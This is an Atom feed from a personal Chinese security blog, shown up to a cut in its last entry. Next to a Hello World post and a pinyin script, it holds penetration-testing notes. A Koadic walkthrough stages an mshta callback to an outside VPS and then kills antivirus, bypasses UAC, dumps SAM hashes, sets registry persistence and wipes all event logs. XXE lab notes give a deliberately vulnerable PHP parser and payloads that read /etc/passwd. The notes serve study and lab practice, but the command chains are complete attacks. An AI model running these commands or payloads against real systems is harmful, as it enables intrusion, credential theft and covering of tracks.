<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>Hexo</title>
  
  
  <link href="http://zzqsmile.github.io/atom.xml" rel="self"/>
  
  <link href="http://zzqsmile.github.io/"/>
  <updated>2020-08-19T15:27:43.330Z</updated>
  <id>http://zzqsmile.github.io/</id>
  
  <author>
    <name>John Doe</name>
    
  </author>
  
  <generator uri="https://hexo.io/">Hexo</generator>
  
  <entry>
    <title>Hello World</title>
    <link href="http://zzqsmile.github.io/2020/08/19/hello-world/"/>
    <id>http://zzqsmile.github.io/2020/08/19/hello-world/</id>
    <published>2020-08-19T15:27:43.330Z</published>
    <updated>2020-08-19T15:27:43.330Z</updated>
    
    <content type="html"><![CDATA[<p>Welcome to <a href="https://hexo.io/">Hexo</a>! This is your very first post. Check <a href="https://hexo.io/docs/">documentation</a> for more info. If you get any problems when using Hexo, you can find the answer in <a href="https://hexo.io/docs/troubleshooting.html">troubleshooting</a> or you can ask me on <a href="https://github.com/hexojs/hexo/issues">GitHub</a>.</p><h2 id="Quick-Start"><a href="#Quick-Start" class="headerlink" title="Quick Start"></a>Quick Start</h2><h3 id="Create-a-new-post"><a href="#Create-a-new-post" class="headerlink" title="Create a new post"></a>Create a new post</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo new <span class="string">&quot;My New Post&quot;</span></span><br></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/writing.html">Writing</a></p><h3 id="Run-server"><a href="#Run-server" class="headerlink" title="Run server"></a>Run server</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo server</span><br></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/server.html">Server</a></p><h3 id="Generate-static-files"><a href="#Generate-static-files" class="headerlink" title="Generate static files"></a>Generate static files</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo generate</span><br></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/generating.html">Generating</a></p><h3 id="Deploy-to-remote-sites"><a href="#Deploy-to-remote-sites" class="headerlink" title="Deploy to remote sites"></a>Deploy to remote sites</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo deploy</span><br></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/one-command-deployment.html">Deployment</a></p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;Welcome to &lt;a href=&quot;https://hexo.io/&quot;&gt;Hexo&lt;/a&gt;! This is your very first post. Check &lt;a href=&quot;https://hexo.io/docs/&quot;&gt;documentation&lt;/a&gt; for</summary>
      
    
    
    
    
  </entry>
  
  <entry>
    <title>实现姓名汉字转成拼音</title>
    <link href="http://zzqsmile.github.io/2019/09/13/python3/%E5%A7%93%E5%90%8D%E6%B1%89%E5%AD%97%E8%BD%AC%E6%8B%BC%E9%9F%B3/"/>
    <id>http://zzqsmile.github.io/2019/09/13/python3/%E5%A7%93%E5%90%8D%E6%B1%89%E5%AD%97%E8%BD%AC%E6%8B%BC%E9%9F%B3/</id>
    <published>2019-09-13T01:00:00.000Z</published>
    <updated>2019-09-25T09:48:14.000Z</updated>
    
    <content type="html"><![CDATA[<p>收藏下，汉字转成拼音，以备不时之需。</p><a id="more"></a><blockquote><p>eg:<br>张三丰 —&gt;  zhangsf<br>吴京 —&gt;  wujing</p></blockquote><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">from xpinyin import Pinyin</span><br><span class="line"></span><br><span class="line">with open(&#39;1.txt&#39;, encoding&#x3D;&#39;utf8&#39;) as fp:</span><br><span class="line">    # print(fp.read())</span><br><span class="line">    word_list &#x3D; fp.readlines()</span><br><span class="line">for word in word_list:</span><br><span class="line">    name &#x3D; word.strip()</span><br><span class="line">    pin &#x3D; Pinyin()</span><br><span class="line">    name_list &#x3D; pin.get_pinyin(name).split(&#39;-&#39;)</span><br><span class="line">    # print(name_list)</span><br><span class="line">    if len(name_list) &gt; 2:</span><br><span class="line">        # print(name_list, len(name_list))</span><br><span class="line">        name &#x3D; name_list[0]</span><br><span class="line">        for i in range(len(name_list)-1):</span><br><span class="line">            name +&#x3D; name_list[i+1][0]</span><br><span class="line">    else:</span><br><span class="line">        name &#x3D; &#39;&#39;.join(name_list)</span><br><span class="line">    print(name)</span><br><span class="line"></span><br></pre></td></tr></table></figure>]]></content>
    
    
    <summary type="html">&lt;p&gt;收藏下，汉字转成拼音，以备不时之需。&lt;/p&gt;</summary>
    
    
    
    <category term="python3" scheme="http://zzqsmile.github.io/categories/python3/"/>
    
    
    <category term="小工具" scheme="http://zzqsmile.github.io/tags/%E5%B0%8F%E5%B7%A5%E5%85%B7/"/>
    
  </entry>
  
  <entry>
    <title>工具导航</title>
    <link href="http://zzqsmile.github.io/2019/08/25/%E5%B7%A5%E5%85%B7%E4%BD%BF%E7%94%A8/%E5%B7%A5%E5%85%B7%E5%AF%BC%E8%88%AA/"/>
    <id>http://zzqsmile.github.io/2019/08/25/%E5%B7%A5%E5%85%B7%E4%BD%BF%E7%94%A8/%E5%B7%A5%E5%85%B7%E5%AF%BC%E8%88%AA/</id>
    <published>2019-08-25T01:00:00.000Z</published>
    <updated>2020-08-23T12:00:08.671Z</updated>
    
    <content type="html"><![CDATA[<p>实用小工具导航</p><a id="more"></a><h5 id="在线"><a href="#在线" class="headerlink" title="在线"></a>在线</h5><p><a href="http://tools.hackxc.cc/cai/">猜密码</a>    |    <a href="http://tools.hackxc.cc/qc/">文本去重</a>    |    <a href="http://scan.ssleye.com/">SSL漏洞在线检测工具</a></p><h5 id="网络空间搜索引擎"><a href="#网络空间搜索引擎" class="headerlink" title="网络空间搜索引擎"></a>网络空间搜索引擎</h5><p><a href="https://www.zoomeye.org/">ZoomEye</a>    |    <a href="https://www.shodan.io/">Shodan</a>    |    <a href="https://fofa.so/">FOFA</a></p><h5 id="windows"><a href="#windows" class="headerlink" title="windows"></a>windows</h5><p><a href="https://www.voidtools.com/zh-cn/downloads/">Everything</a></p><h5 id="JBOSS"><a href="#JBOSS" class="headerlink" title="JBOSS"></a>JBOSS</h5><ul><li><a href="https://github.com/joaomatosf/jexboss">https://github.com/joaomatosf/jexboss</a></li></ul><h5 id="SSRF"><a href="#SSRF" class="headerlink" title="SSRF"></a>SSRF</h5><ul><li><a href="https://github.com/tarunkant/Gopherus">gopher链接生成工具</a></li></ul>]]></content>
    
    
    <summary type="html">&lt;p&gt;实用小工具导航&lt;/p&gt;</summary>
    
    
    
    <category term="工具" scheme="http://zzqsmile.github.io/categories/%E5%B7%A5%E5%85%B7/"/>
    
    
    <category term="传送门" scheme="http://zzqsmile.github.io/tags/%E4%BC%A0%E9%80%81%E9%97%A8/"/>
    
  </entry>
  
  <entry>
    <title>渗透测试流程导航</title>
    <link href="http://zzqsmile.github.io/2019/08/25/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/"/>
    <id>http://zzqsmile.github.io/2019/08/25/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/</id>
    <published>2019-08-25T01:00:00.000Z</published>
    <updated>2020-08-23T12:03:04.876Z</updated>
    
    <content type="html"><![CDATA[<a id="more"></a><h4 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h4><h6 id="whois"><a href="#whois" class="headerlink" title="whois"></a>whois</h6><p>包括但不限于以下信息：</p><pre><code>域名服务商 ：域名拥有者 ：电     话 ：邮     箱 ：地     址 ：</code></pre><ul><li>kali whois命令</li><li><a href="http://whois.chinaz.com/">站长之家</a></li><li><a href="https://whois.aizhan.com/">爱站工具网</a></li><li><a href="http://www.beianbeian.com/">备案</a></li><li><a href="https://www.tianyancha.com/">天眼查</a></li></ul><h6 id="真实IP"><a href="#真实IP" class="headerlink" title="真实IP"></a>真实IP</h6><h6 id="子域名"><a href="#子域名" class="headerlink" title="子域名"></a>子域名</h6><p><strong>工具</strong></p><ul><li>Layer子域名挖掘机</li></ul><p><strong>在线</strong></p><ul><li><a href="https://phpinfo.me/domain/">https://phpinfo.me/domain/</a></li><li><a href="https://dns.aizhan.com/">IP反查绑定域名网站</a></li></ul><p><strong>搜索引擎枚举</strong></p><ul><li><a href="https://www.google.com/">Google hacking</a></li></ul><p><strong>第三方聚合应用枚举</strong></p><ul><li><a href="https://dnsdumpster.com/">DNSdumpster</a></li></ul><p><strong>证书透明度公开日志枚举</strong></p><ul><li><a href="https://crt.sh/">crt.sh</a></li><li><a href="https://censys.io/">censys</a></li></ul><h6 id="端口扫描"><a href="#端口扫描" class="headerlink" title="端口扫描"></a>端口扫描</h6><ul><li><a href="https://nmap.org/">nmap</a></li></ul><h6 id="目录后台"><a href="#目录后台" class="headerlink" title="目录后台"></a>目录后台</h6><ul><li><p>御剑</p></li><li><p><a href="https://github.com/maurosoria/dirsearch">dirsearch</a></p><blockquote><p>字典：<a href="http://github.itzmx.com/juzeon/fire/master/dics_cn.zip">http://github.itzmx.com/juzeon/fire/master/dics_cn.zip</a></p></blockquote></li><li><p><a href="https://github.com/maurosoria/dirsearch">dirsearch</a></p></li><li></li><li><p><a href="https://github.com/H4ckForJob/dirmap">dirmap</a></p></li><li><p><a href="https://www.google.com/">Google hacking</a></p></li><li><p>robots.txt</p></li></ul><h6 id="C段"><a href="#C段" class="headerlink" title="C段"></a>C段</h6><ul><li><a href="http://www.webscan.cc/">webscan</a></li><li><a href="https://phpinfo.me/bing/">在线</a></li></ul><h6 id="指纹识别"><a href="#指纹识别" class="headerlink" title="指纹识别"></a>指纹识别</h6><p><strong>工具</strong></p><ul><li>御剑Web指纹识别</li><li>WhatWeb</li><li>WebRobo</li><li>椰树</li><li>轻量WEB指纹识别</li></ul><p><strong>在线CMS识别</strong></p><ul><li><a href="http://whatweb.bugscaner.com/look/">BugScaner</a></li><li><a href="http://www.yunsee.cn/finger.html">云悉指纹</a></li><li><a href="https://whatweb.net/">WhatWeb</a></li></ul><h6 id="证书"><a href="#证书" class="headerlink" title="证书"></a>证书</h6><ul><li><a href="https://crt.sh/">crt.sh</a></li><li><a href="https://censys.io/">censys</a></li></ul><h6 id="github"><a href="#github" class="headerlink" title="github"></a>github</h6><h6 id="社工"><a href="#社工" class="headerlink" title="社工"></a>社工</h6><ul><li>略</li></ul><h6 id="网络空间搜索引擎"><a href="#网络空间搜索引擎" class="headerlink" title="网络空间搜索引擎"></a>网络空间搜索引擎</h6><ul><li>ZoomEye <a href="https://www.zoomeye.org/">https://www.zoomeye.org/</a></li><li>Shodan  <a href="https://www.shodan.io/">https://www.shodan.io/</a></li><li>FOFA    <a href="https://fofa.so/">https://fofa.so/</a></li></ul><h6 id="远程连接"><a href="#远程连接" class="headerlink" title="远程连接"></a>远程连接</h6><p>中国菜刀        |    <a href="https://github.com/AntSwordProject/antSword/releases">中国蚁剑</a> <a href="https://github.com/AntSwordProject/AntSword-Loader">官方加载器</a>     |    Cknife        |    <a href="https://github.com/rebeyond/Behinder">冰蝎</a>     |</p><p>xshell    |    putty     |    <a href="https://www.teamviewer.cn/cn/">teamviewer</a>    |    <a href="https://sunlogin.oray.com/personal/">向日葵</a>        |</p><h6 id="后渗透工具"><a href="#后渗透工具" class="headerlink" title="后渗透工具"></a>后渗透工具</h6><p><a href="https://github.com/rapid7/metasploit-framework">MSF</a>        |    <a href="https://github.com/zerosum0x0/koadic">Koadic</a>    |    </p>]]></content>
    
    
      
      
    <summary type="html">&lt;a id=&quot;more&quot;&gt;&lt;/a&gt;

&lt;h4 id=&quot;信息收集&quot;&gt;&lt;a href=&quot;#信息收集&quot; class=&quot;headerlink&quot; title=&quot;信息收集&quot;&gt;&lt;/a&gt;信息收集&lt;/h4&gt;&lt;h6 id=&quot;whois&quot;&gt;&lt;a href=&quot;#whois&quot; class=&quot;headerl</summary>
      
    
    
    
    <category term="渗透测试" scheme="http://zzqsmile.github.io/categories/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/"/>
    
    
    <category term="传送门" scheme="http://zzqsmile.github.io/tags/%E4%BC%A0%E9%80%81%E9%97%A8/"/>
    
  </entry>
  
  <entry>
    <title>Koadic使用教程笔记</title>
    <link href="http://zzqsmile.github.io/2019/08/21/%E5%B7%A5%E5%85%B7%E4%BD%BF%E7%94%A8/Koadic%E4%BD%BF%E7%94%A8%E6%95%99%E7%A8%8B%E7%AC%94%E8%AE%B0/"/>
    <id>http://zzqsmile.github.io/2019/08/21/%E5%B7%A5%E5%85%B7%E4%BD%BF%E7%94%A8/Koadic%E4%BD%BF%E7%94%A8%E6%95%99%E7%A8%8B%E7%AC%94%E8%AE%B0/</id>
    <published>2019-08-21T01:00:00.000Z</published>
    <updated>2020-08-23T12:03:36.760Z</updated>
    
    <content type="html"><![CDATA[<p>记录Koadic使用笔记</p><a id="more"></a><h5 id="安装"><a href="#安装" class="headerlink" title="安装"></a>安装</h5><pre><code>[root@host ~]# git clone https://github.com/zerosum0x0/koadic.git[root@host ~]# cd koadic/[root@host koadic]# ./koadic                             .                           / \     _                   _ | |    | | _____   __ _  __| || |  ___    | |/ / _ \ / _` |/ _` ||.| / __|    |   / (o) | (_| | (_| ||.|| (__    |_|\_\_^_/ \__,_|\__,_||:| \___|                           |:|                        ~\==8==/~                            8                            O        -&#123; COM Command &amp; Control &#125;-      Windows Post-Exploitation Tools             Endless Intellect            ~[ Version:  0xA ]~            ~[ Stagers:    6 ]~            ~[ Implants:  42 ]~(koadic: sta/js/mshta)# </code></pre><p><strong>注意：</strong> 需要<code>python3</code>环境，安装过程如果报错，可能缺少<code>python</code>模块，请使用<code>pip3 install [缺少模块]</code>安装。</p><h5 id="使用帮助"><a href="#使用帮助" class="headerlink" title="使用帮助"></a>使用帮助</h5><ul><li><p><code>help</code>命令查看</p><p>  (koadic: sta/js/mshta)# help </p><pre><code>  COMMAND     DESCRIPTION       ---------   -------------     api         turn off/on the rest api  cmdshell    command shell to interact with a zombie  creds       shows collected credentials  domain      shows collected domain information  edit        shell out to an editor for the current module  exit        exits the program  help        displays help info for a command  info        shows the current module options  jobs        shows info about jobs  kill        kill a job or all jobs  listeners   shows info about stagers  load        reloads all modules  previous    go back to the last used module  pyexec      evals some python  repeatjobs  shows info about repeating jobs  run         runs the current module  set         sets a variable for the current module  sounds      turn sounds off/on: sound(0|1)  taco        taco time         unset       unsets a variable for the current module  use         switch to a different module  verbose     turn verbosity off/on: verbose (0|1)  zombies     lists hooked targets</code></pre><p>  Use “help command” to find more info about a command.</p><p>  (koadic: sta/js/mshta)# </p></li></ul><h5 id="KOADIC模块说明"><a href="#KOADIC模块说明" class="headerlink" title="KOADIC模块说明"></a>KOADIC模块说明</h5><ul><li><p>输入use和空格然后连按两下Tab键查看模块</p><p>  (koadic: sta/js/mshta)# use [Tab][Tab]<br>  implant/  stager/<br>  (koadic: sta/js/mshta)# </p></li></ul><blockquote><p>stager开头的模块是用来反弹主机的，implant开头的模块是用来对反弹的主机进行操作</p></blockquote><h5 id="KOADIC使用"><a href="#KOADIC使用" class="headerlink" title="KOADIC使用"></a>KOADIC使用</h5><p>Koadic有几个内置模块，“stager/js/mshta”是首次执行该工具时的默认配置模块。你可以通过“info”命令来查看并配置模块。</p><pre><code>(koadic: sta/js/mshta)# info     NAME       VALUE               REQ     DESCRIPTION         -----      ------------        ----    -------------       SRVHOST    107.182.30.95       yes     Where the stager should call home    SRVPORT    9999                yes     The port to listen for stagers on    EXPIRES                        no      MM/DD/YYYY to stop calling home    KEYPATH                        no      Private key for TLS communications    CERTPATH                       no      Certificate for TLS communications    MODULE                         no      Module to run once zombie is staged(koadic: sta/js/mshta)# </code></pre><p>可以看出，我们必须设置<code>SRVHOST</code>和<code>SRVPORT</code>参数才能使用<code>satger</code>。运行以下命令，用你自己的IP替换IP和端口号，并运行：</p><pre><code>(koadic: sta/js/mshta)# set SRVHOST 107.182.30.95[+] SRVHOST =&gt; 107.182.30.95    (koadic: sta/js/mshta)# set SRVPORT 9999[+] SRVPORT =&gt; 9999(koadic: sta/js/mshta)# run[+] Spawned a stager at http://107.182.30.95:9999/Dj7wx[!] Don&#39;t edit this URL! (See: &#39;help portfwd&#39;)[&gt;] mshta http://107.182.30.95:9999/Dj7wx(koadic: sta/js/mshta)# </code></pre><p>复制日志底部生成的命令并在目标计算机上运行。</p><p><img src="http://qiniuyun.zzqsmile.top/blog/20190821/Sg9GQPnKIkHq.png?imageMogr2/auto-orient/blur/1x0/quality/75%7Cwatermark/2/text/enpxc21pbGUt5Y6f5Yib/font/5a6L5L2T/fontsize/800/fill/I0VDMUY0MQ==/dissolve/51/gravity/Center/dx/10/dy/10%7Cimageslim" alt="mark"></p><blockquote><p>一个zombie机器被创建，目标机器现在已连接到了mshta stager server。<br>立即创建僵尸，目标机器现在连接到mshta stager服务器。<br>可以运行以下命令进行确认：</p></blockquote><pre><code>(koadic: sta/js/mshta)# zombies</code></pre><p><img src="http://qiniuyun.zzqsmile.top/blog/20190821/0oMDlbgKXmsa.png?imageMogr2/auto-orient/blur/1x0/quality/75%7Cwatermark/2/text/enpxc21pbGUt5Y6f5Yib/font/5a6L5L2T/fontsize/800/fill/I0VDMUY0MQ==/dissolve/51/gravity/Center/dx/10/dy/10%7Cimageslim" alt="mark"></p><blockquote><p>该命令将显示所有的zombie机器，我们可以看到这里只显示了个“Zombie 0”，这是因为它是迄今为止我们唯一创建的一个zombie。</p></blockquote><h5 id="“杀死”防毒软件"><a href="#“杀死”防毒软件" class="headerlink" title="“杀死”防毒软件"></a>“杀死”防毒软件</h5><blockquote><p>下一步是杀死windows defender和所有其他正在运行的防病毒软件，以确保我们可以在目标计算机上执行任何我们想要执行的命令。</p></blockquote><p>命令如下：</p><pre><code>(koadic: sta/js/mshta)# use implant/manage/killav (koadic: imp/man/killav)# info (koadic: imp/man/killav)# set ZOMBIE 0(koadic: imp/man/killav)# run </code></pre><p><img src="http://qiniuyun.zzqsmile.top/blog/20190821/98B2ABbANAK9.png?imageMogr2/auto-orient/blur/1x0/quality/75%7Cwatermark/2/text/enpxc21pbGUt5Y6f5Yib/font/5a6L5L2T/fontsize/800/fill/I0VDMUY0MQ==/dissolve/51/gravity/Center/dx/10/dy/10%7Cimageslim" alt="mark"></p><p>要确认模块是否已成功执行，请运行：</p><pre><code>(koadic: imp/man/killav)# zombies 0</code></pre><h5 id="权限提升"><a href="#权限提升" class="headerlink" title="权限提升"></a>权限提升</h5><p>使用<code>implant/elevate/bypassuac_compdefaults</code>，命令如下：</p><pre><code>(koadic: imp/man/killav)# use implant/elevate/bypassuac_compdefaults (koadic: imp/ele/bypassuac_compdefaults)# info (koadic: imp/ele/bypassuac_compdefaults)# listeners (koadic: imp/ele/bypassuac_compdefaults)# set PAYLOAD 0(koadic: imp/ele/bypassuac_compdefaults)# run </code></pre><p>运行以下命令确认模块是否已被成功执行：</p><pre><code>(koadic: imp/ele/bypassuac_compdefaults)# zombies</code></pre><blockquote><p>使用<code>implant/manage/exec_cmd</code>在CMD上运行任何Windows命令。</p></blockquote><p>命令如下：</p><pre><code>(koadic: imp/ele/bypassuac_compdefaults)# use implant/manage/exec_cmd (koadic: imp/man/exec_cmd)# info (koadic: imp/man/exec_cmd)# set ZOMBIE 0(koadic: imp/man/exec_cmd)# run </code></pre><p><img src="http://qiniuyun.zzqsmile.top/blog/20190821/HF2nRUpjOu7I.png?imageMogr2/auto-orient/blur/1x0/quality/75%7Cwatermark/2/text/enpxc21pbGUt5Y6f5Yib/font/5a6L5L2T/fontsize/800/fill/I0VDMUY0MQ==/dissolve/51/gravity/Center/dx/10/dy/10%7Cimageslim" alt="mark"></p><p><code>hostname</code>命令在目标机器上执行，将返回机器的名称。</p><blockquote><p>将CMD参数更改为<code>whoami</code>会返回我们正在运行的用户的名称,如下所示。</p></blockquote><p><img src="http://qiniuyun.zzqsmile.top/blog/20190821/5mEHiN8qhfxa.png?imageMogr2/auto-orient/blur/1x0/quality/75%7Cwatermark/2/text/enpxc21pbGUt5Y6f5Yib/font/5a6L5L2T/fontsize/800/fill/I0VDMUY0MQ==/dissolve/51/gravity/Center/dx/10/dy/10%7Cimageslim" alt="mark"></p><ul><li><p>cmdshell也可以直接进入终端模式下执行命令，如下：</p><p>  (koadic: imp/man/exec_cmd)# cmdshell 0<br>  [koadic: ZOMBIE 0 (192.168.199.193) - C:]&gt; whoami<br>  [*] Zombie 0: Job 9 (implant/manage/exec_cmd) created.<br>  Result for <code>cd C:\ &amp; whoami</code>:<br>  zzqsmile\administrator                       </p><p>  [koadic: ZOMBIE 0 (192.168.199.193) - C:]&gt; </p></li></ul><p><img src="http://qiniuyun.zzqsmile.top/blog/20190821/JxvGd16C5jeN.png?imageMogr2/auto-orient/blur/1x0/quality/75%7Cwatermark/2/text/enpxc21pbGUt5Y6f5Yib/font/5a6L5L2T/fontsize/800/fill/I0VDMUY0MQ==/dissolve/51/gravity/Center/dx/10/dy/10%7Cimageslim" alt="mark"></p><h5 id="INTEL-RAID-持久性和数据渗漏"><a href="#INTEL-RAID-持久性和数据渗漏" class="headerlink" title="INTEL RAID/持久性和数据渗漏"></a>INTEL RAID/持久性和数据渗漏</h5><blockquote><p>使用<code>implant/gather/hashdump_sam</code>模块，来获取目标计算机上的哈希值。</p></blockquote><p>命令如下：</p><pre><code>(koadic: imp/man/exec_cmd)# use implant/gather/hashdump_sam (koadic: imp/gat/hashdump_sam)# info (koadic: imp/gat/hashdump_sam)# set GETSYSHIVE true(koadic: imp/gat/hashdump_sam)# run </code></pre><blockquote><p>使用<code>implant/persist/registry</code>模块，运行以下命令：</p></blockquote><pre><code>(koadic: imp/gat/hashdump_sam)# use implant/persist/registry (koadic: imp/per/registry)# info   (koadic: imp/per/registry)# set PAYLOAD 0(koadic: imp/per/registry)# set ZOMBIE 0(koadic: imp/per/registry)# run </code></pre><p>使用该模块，我们可以将<code>CLEANUP</code>参数设置为<code>true</code>以删除注册表项，从而隐藏我们的轨迹。</p><blockquote><p>对于刚刚我们获取哈希值的操作，可以运行<code>for /F “tokens=*” %1 in (‘wevtutil.exe el’) DO wevtutil.exe cl “%1″</code>命令，使用<code>implant/manage/exec_cmd</code>模块来清除所有事件日志。命令如下：</p></blockquote><pre><code>(koadic: imp/per/registry)# use implant/manage/exec_cmd (koadic: imp/man/exec_cmd)# info (koadic: imp/man/exec_cmd)# set ZOMBIE 0(koadic: imp/man/exec_cmd)# set CMD for /F “tokens=*” %1 in (‘wevtutil.exe el’) DO wevtutil.exe cl “%1”(koadic: imp/man/exec_cmd)# run</code></pre><h5 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h5><p><a href="https://cloud.tencent.com/developer/article/1425744">后渗透工具Koadic实战</a></p><p><a href="https://www.cnblogs.com/sch01ar/p/7857531.html">windows提权辅助工具koadic</a></p>]]></content>
    
    
    <summary type="html">&lt;p&gt;记录Koadic使用笔记&lt;/p&gt;</summary>
    
    
    
    <category term="工具" scheme="http://zzqsmile.github.io/categories/%E5%B7%A5%E5%85%B7/"/>
    
    
    <category term="Koadic" scheme="http://zzqsmile.github.io/tags/Koadic/"/>
    
  </entry>
  
  <entry>
    <title>msf安装使用教程</title>
    <link href="http://zzqsmile.github.io/2019/08/20/%E5%B7%A5%E5%85%B7%E4%BD%BF%E7%94%A8/msf/"/>
    <id>http://zzqsmile.github.io/2019/08/20/%E5%B7%A5%E5%85%B7%E4%BD%BF%E7%94%A8/msf/</id>
    <published>2019-08-20T01:00:00.000Z</published>
    <updated>2019-09-04T08:41:30.000Z</updated>
    
    <content type="html"><![CDATA[<p>CentOS安装教程</p><a id="more"></a><p><a href="https://www.cnblogs.com/hiccup/p/4392082.html">CentOS6下安装</a></p><p><a href="https://www.1000001001.me/index.php/archives/8/">CentOS7下安装</a></p><p><a href="https://blog.csdn.net/qq_36119192/article/details/83215257#%E5%AE%89%E8%A3%85Metasploit">msf使用教程</a></p>]]></content>
    
    
    <summary type="html">&lt;p&gt;CentOS安装教程&lt;/p&gt;</summary>
    
    
    
    <category term="tools" scheme="http://zzqsmile.github.io/categories/tools/"/>
    
    
    <category term="msf" scheme="http://zzqsmile.github.io/tags/msf/"/>
    
  </entry>
  
  <entry>
    <title>XXE漏洞笔记</title>
    <link href="http://zzqsmile.github.io/2019/08/19/web%E5%AE%89%E5%85%A8/XXE/"/>
    <id>http://zzqsmile.github.io/2019/08/19/web%E5%AE%89%E5%85%A8/XXE/</id>
    <published>2019-08-19T01:00:00.000Z</published>
    <updated>2020-08-23T12:02:53.168Z</updated>
    
    <content type="html"><![CDATA[<p>好记性不如烂笔头，关于XXE还是要记录下自己的学习过程，以后看起来会更清楚，详细原理不再多讲，简单做个实验记录下笔记以便使用。</p><a id="more"></a><h5 id="实验环境"><a href="#实验环境" class="headerlink" title="实验环境"></a>实验环境</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">web服务器：10.12.10.198</span><br><span class="line">VPS：     107.182.30.95      </span><br></pre></td></tr></table></figure><h5 id="实验一：有回显读本地敏感文件-Normal-XXE"><a href="#实验一：有回显读本地敏感文件-Normal-XXE" class="headerlink" title="实验一：有回显读本地敏感文件(Normal XXE)"></a>实验一：有回显读本地敏感文件(Normal XXE)</h5><p>web服务器放置解析XML的php代码：</p><p><strong>示例代码</strong></p><p><strong>xml.php</strong></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line">    libxml_disable_entity_loader (<span class="literal">false</span>);</span><br><span class="line">    $xmlfile = file_get_contents(<span class="string">&#x27;php://input&#x27;</span>);</span><br><span class="line">    $dom = <span class="keyword">new</span> DOMDocument();</span><br><span class="line">    $dom-&gt;loadXML($xmlfile, LIBXML_NOENT | LIBXML_DTDLOAD); </span><br><span class="line">    $creds = simplexml_import_dom($dom);</span><br><span class="line">    <span class="keyword">echo</span> $creds;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p><strong>payload:</strong></p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=&quot;1.0&quot; encoding=&quot;utf-8&quot;?&gt;</span> </span><br><span class="line"><span class="meta">&lt;!DOCTYPE <span class="meta-keyword">creds</span> [  </span></span><br><span class="line"><span class="meta"><span class="meta">&lt;!ENTITY <span class="meta-keyword">goodies</span> <span class="meta-keyword">SYSTEM</span> <span class="meta-string">&quot;file:///etc/passwd&quot;</span>&gt;</span> ]&gt;</span> </span><br><span class="line"><span class="tag">&lt;<span class="name">creds</span>&gt;</span><span class="symbol">&amp;goodies;</span><span class="tag">&lt;/<span class="name">creds</span>&gt;</span></span><br></pre></td></tr></table></figure><p><strong>结果如下</strong></p><p><img src="http://qiniuyun.zzqsmile.top/blog/20190819/a0kJBVemEnx0.png?imageMogr2/auto-orient/blur/1x0/quality/75%7Cwatermark/2/text/enpxc21pbGUt5Y6f5Yib/font/5a6L5L2T/fontsize/800/fill/I0VDMUY0MQ==/dissolve/51/gravity/Center/dx/10/dy/10%7Cimageslim" alt="mark"></p><p>读取文件种可能会有特殊符号如<code>&amp;</code>,<code>&lt;</code>,<code>&gt;</code>,<code>&quot;</code>,<code>&#39;</code>等会导致读取失败，比如下面读取含有特殊字符文件<code>2.txt</code>失败：</p><p><img src="http://qiniuyun.zzqsmile.top/blog/20190820/uU0qkKQgzgrt.png?imageMogr2/auto-orient/blur/1x0/quality/75%7Cwatermark/2/text/enpxc21pbGUt5Y6f5Yib/font/5a6L5L2T/fontsize/800/fill/I0VDMUY0MQ==/dissolve/51/gravity/Center/dx/10/dy/10%7Cimageslim" alt="mark"></p><p>废话不多说，解决办法有两种：</p><ul><li>第一种：将读取文件使用<code>base64</code>编码即可</li></ul><p><strong>payload:</strong></p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=&quot;1.0&quot; encoding=&quot;utf-8&quot;?&gt;</span> </span><br><span class="line"><span class="meta">&lt;!DOCTYPE <span class="meta-keyword">creds</span> [  </span></span><br><span class="line"><span class="meta"><span class="meta">&lt;!ENTITY <span class="meta-keyword">goodies</span> <span class="meta-keyword">SYSTEM</span> <span class="meta-string">&quot;php://filter/read=convert.base64-encode/resource=file:///etc/passwd&quot;</span>&gt;</span> ]&gt;</span> </span><br><span class="line"><span class="tag">&lt;<span class="name">creds</span>&gt;</span><span class="symbol">&amp;goodies;</span><span class="tag">&lt;/<span 